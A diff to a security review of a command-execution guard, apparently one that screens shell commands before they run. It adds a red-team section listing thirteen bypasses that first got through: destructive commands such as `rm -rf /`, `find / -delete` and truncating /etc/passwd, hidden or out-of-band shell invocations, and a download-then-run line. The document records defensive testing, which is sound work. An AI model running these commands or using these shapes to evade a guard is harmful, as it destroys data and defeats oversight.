@@ -64,9 +64,9 @@ trusted:    the machine/user policy file, organisation policy outside any repo,
 
 ### T1 — A dangerous command reaches execution
 
-**Control.** Deterministic classification, hard floor of 30 non-lowerable rules.
+**Control.** Deterministic classification, hard floor of 31 non-lowerable rules.
 
-**Status: probed.** 220 corpus cases in [`scripts/guard_corpus.py`](../scripts/guard_corpus.py),
+**Status: probed.** 248 corpus cases in [`scripts/guard_corpus.py`](../scripts/guard_corpus.py),
 run by `scripts/test-guard.sh` section 1. Every dangerous case resolves to `DENY` with a named
 rule; every benign case to `ALLOW`.
 
@@ -91,6 +91,33 @@ weakened build answers `ALLOW` to `git status && rm -rf /`.
 not knowable from the command string. They resolve to `UNRESOLVED`, which is `ASK`, not `ALLOW`.
 An interpreted program that assembles its command at runtime is not visible from its invocation.
 Both are documented.
+
+### T2b — A bypass nobody wrote a test for
+
+The `BYPASS` corpus covers the shapes the guard was *designed* against, which is a weaker claim
+than it looks: it tests the designer's imagination.
+
+**Status: probed by attack.** A separate pass tried 43 techniques with no corresponding test.
+**Thirteen reached `ALLOW` on the first attempt**, in four families:
+
+| Family | Reached `ALLOW` |
+| --- | --- |
+| the program is hidden | `$SHELL -c '…'`, `` `echo rm` -rf / ``, `busybox rm -rf /` |
+| the payload arrives out of band | `bash <<< '…'`, `bash < script.sh`, `psql -f x.sql`, `cat drop.sql \| psql` |
+| deletion by another route | `find / -delete`, `perl -e 'unlink glob "/*"'`, `__import__('shutil').rmtree('/')`, `truncate -s 0 /etc/passwd` |
+| fetch and execution separated | `curl URL -o /tmp/s && sh /tmp/s` |
+
+All thirteen are fixed. Four rules were added — `EXEC_UNRESOLVED_COMMAND`, `EXEC_OPAQUE_INPUT`,
+`DB_OPAQUE_STATEMENT`, `FETCH_THEN_EXECUTE` — and the parser gained here-strings, multi-call
+binaries, and detection of a command whose program name it cannot read. After the fixes, 0 of 43
+reach `ALLOW`, the existing corpora are unchanged, and p95 is unmoved.
+
+All 28 are permanent regression cases in the `REDTEAM` corpus.
+
+**The lesson is about method, not about these thirteen.** Four green corpora and seven passing
+mutation probes were not sufficient evidence that the guard could not be bypassed; attacking it
+was. A guard reviewed only against the cases its author thought of is reviewed against the wrong
+threat model.
 
 ### T3 — A parse failure is read as permission
 
@@ -367,9 +394,9 @@ because the pattern it removes no longer exists — fails loudly rather than pas
 ## Conclusion
 
 The release adds a real control with real limits, and both are documented in the same voice.
-Thirteen of fourteen threats are probed; T14 is reasoned about and documented as unmitigated;
+Fourteen of fifteen threats are probed; T14 is reasoned about and documented as unmitigated;
 two items are explicitly marked unproven. Eleven defects were found — four of them security
 defects, three of which would have made a control silently inert while continuing to report
 success. That is the failure mode probe discipline exists to catch, and it caught them. Two more
-were found by reading the diff after every suite was green, which is why "the tests pass" is not
-where this review ended.
+were found by reading the diff after every suite was green, and thirteen bypasses were found by
+attacking the guard after that — which is why "the tests pass" is not where this review ended.
